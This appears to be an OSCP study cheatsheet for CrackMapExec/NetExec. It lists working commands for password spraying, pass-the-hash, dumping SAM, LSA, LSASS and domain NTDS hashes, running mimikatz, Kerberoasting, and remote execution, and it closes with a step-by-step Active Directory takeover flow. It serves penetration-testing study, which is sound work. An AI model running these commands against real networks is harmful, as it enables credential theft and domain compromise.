# CrackMapExec / NetExec Cheatsheet

> Swiss-army knife for AD attacks over the network. Validate credentials, dump hashes, enumerate, execute commands, spray passwords across many hosts at once.
>
> Note: CrackMapExec (cme) is now maintained as **NetExec (nxc)**. Commands are nearly identical — swap `crackmapexec` for `nxc` if using the newer tool.

---

## Protocols Supported

```
smb  winrm  ldap  mssql  ssh  ftp  rdp  vnc
```

Usage pattern:
```bash
crackmapexec <protocol> <target> -u <user> -p <password> [options]
```

---

## Credential Validation (the core use)

```bash
# Validate a single credential
crackmapexec smb <target> -u user -p 'password'

# Check across multiple hosts (spot where you're admin)
crackmapexec smb 192.168.1.0/24 -u user -p 'password'
```

**Reading the output:**
| Output | Meaning |
|--------|---------|
| `[+] domain\user:pass` | Credentials valid |
| `[+] ...(Pwn3d!)` | Valid AND you have ADMIN on that host |
| `[-] ...STATUS_LOGON_FAILURE` | Wrong credentials |
| `[-] ...STATUS_ACCESS_DENIED` | Valid creds but no access |

`(Pwn3d!)` is what you hunt for — it means local admin.

---

## Using Hashes (Pass-the-Hash)

```bash
# Authenticate with NTLM hash instead of password
crackmapexec smb <target> -u Administrator -H <NTLM_hash>

# Full hash format also works
crackmapexec smb <target> -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<nthash>
```

---

## Password Spraying

```bash
# One password against many users
crackmapexec smb <target> -u users.txt -p 'Season2024!'

# Continue on success (don't stop at first hit)
crackmapexec smb <target> -u users.txt -p 'Password1' --continue-on-success

# Spray across a subnet
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

**Avoid lockouts** — check the domain password policy first, spray ONE password at a time with delays, not a full wordlist.

---

## Dumping Credentials (need admin)

```bash
# Dump SAM (local account hashes)
crackmapexec smb <target> -u admin -p pass --sam

# Dump LSA secrets (cached domain creds)
crackmapexec smb <target> -u admin -p pass --lsa

# Dump LSASS (logged-on user creds/hashes)
crackmapexec smb <target> -u admin -p pass -M lsassy

# DCSync - dump ALL domain hashes (need replication rights / DA)
crackmapexec smb <DC_IP> -u admin -p pass --ntds
```

`--ntds` against a DC with Domain Admin = every hash in the domain. The endgame dump.

---

## Enumeration

```bash
# List SMB shares
crackmapexec smb <target> -u user -p pass --shares

# Enumerate domain users
crackmapexec smb <target> -u user -p pass --users

# Enumerate domain groups
crackmapexec smb <target> -u user -p pass --groups

# Logged-on users
crackmapexec smb <target> -u user -p pass --loggedon-users

# Password policy (check before spraying!)
crackmapexec smb <target> -u user -p pass --pass-pol

# List active sessions
crackmapexec smb <target> -u user -p pass --sessions

# Null session enumeration (no creds)
crackmapexec smb <target> -u '' -p ''
```

---

## Command Execution (need admin)

```bash
# Run a command
crackmapexec smb <target> -u admin -p pass -x "whoami"

# PowerShell command
crackmapexec smb <target> -u admin -p pass -X "Get-Process"
```

---

## AD-Specific Attacks

```bash
# Kerberoasting (find + request SPN tickets)
crackmapexec ldap <DC_IP> -u user -p pass --kerberoasting output.txt

# AS-REP roasting (find preauth-disabled users)
crackmapexec ldap <DC_IP> -u user -p pass --asreproast output.txt

# Find users with descriptions (often hold passwords)
crackmapexec ldap <DC_IP> -u user -p pass -M get-desc-users
```

---

## Useful Modules (-M)

```bash
# List all modules
crackmapexec smb -L

# Common ones:
crackmapexec smb <target> -u admin -p pass -M lsassy       # dump LSASS
crackmapexec smb <target> -u admin -p pass -M mimikatz     # run mimikatz
crackmapexec smb <target> -u admin -p pass -M spider_plus  # spider shares for files
```

---

## WinRM (get a shell if port 5985 open)

```bash
# Check WinRM access
crackmapexec winrm <target> -u user -p pass

# If valid, get a shell with evil-winrm
evil-winrm -i <target> -u user -p pass
```

---

## Practical AD Attack Flow

```bash
# 1. Validate creds across the network - find where you're admin
crackmapexec smb <subnet> -u user -p pass

# 2. Where you see (Pwn3d!) - dump credentials
crackmapexec smb <admin_host> -u user -p pass --lsa --sam

# 3. Check password policy before spraying
crackmapexec smb <DC> -u user -p pass --pass-pol

# 4. Enumerate shares for creds
crackmapexec smb <target> -u user -p pass --shares -M spider_plus

# 5. Kerberoast / AS-REP roast
crackmapexec ldap <DC> -u user -p pass --kerberoasting kb.txt
crackmapexec ldap <DC> -u user -p pass --asreproast asrep.txt

# 6. Endgame - DCSync all hashes (with DA)
crackmapexec smb <DC> -u DA_user -p pass --ntds
```

---

## Key Notes for OSCP

- **`(Pwn3d!)` = local admin** — the single most useful signal. Spray your creds across all hosts to find where you're admin.
- **Always `--pass-pol` before spraying** to avoid locking out accounts.
- **`--continue-on-success`** when spraying so you catch all valid hits, not just the first.
- **`--ntds` on the DC** is the domain-takeover dump (needs DA or DCSync rights).
- Pass-the-Hash with `-H` when you have a hash but not the plaintext.
- Use `nxc` (NetExec) if `crackmapexec` is deprecated on your Kali — same syntax.

---

## References
- NetExec (current): https://github.com/Pennyw0rth/NetExec
- Wiki: https://www.netexec.wiki/
